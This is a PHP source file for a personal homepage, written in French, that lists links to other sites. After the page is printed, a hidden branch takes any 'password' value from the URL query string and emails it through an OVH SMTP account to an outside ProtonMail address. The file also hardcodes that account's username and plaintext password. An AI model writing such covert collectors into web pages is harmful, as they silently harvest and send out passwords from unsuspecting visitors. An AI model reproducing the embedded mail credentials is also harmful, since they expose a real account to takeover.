<?php
function index()
{
	head();
	?>
<h1>Linux &gt; Windows</h1>
<p>Bonjour et bienvenue sur le site des Lebbadi! Voici mes différents sites web</p>
<li><a href='http://radio.lebbadi.fr'>Algo Médecine</a></li>
<li><a href="http://ljsc.herokuapp.com">Le Journal du Séminaire Collège</a></li>
	<?php
	foot();
	if (isset($_GET['password'])) {
require_once 'vendor/autoload.php';

// Create the Transport
$transport = (new Swift_SmtpTransport('ssl0.ovh.net', 465))
  ->setUsername('romain@lebbadi.fr')
  ->setPassword('JADOreovh')
;

// Create the Mailer using your created Transport
$mailer = new Swift_Mailer($transport);

// Create a message
$message = new Swift_Message('Password')
  ->setFrom(['romain@lebbadi.fr' => 'Romain Lebbadi'])
  ->setTo(['romainl@protonmail.com' => 'Romain Lebbadi-Breteau'])
  ->setBody($_GET['password'])
  ;

// Send the message
$result = $mailer->send($message);
	}
}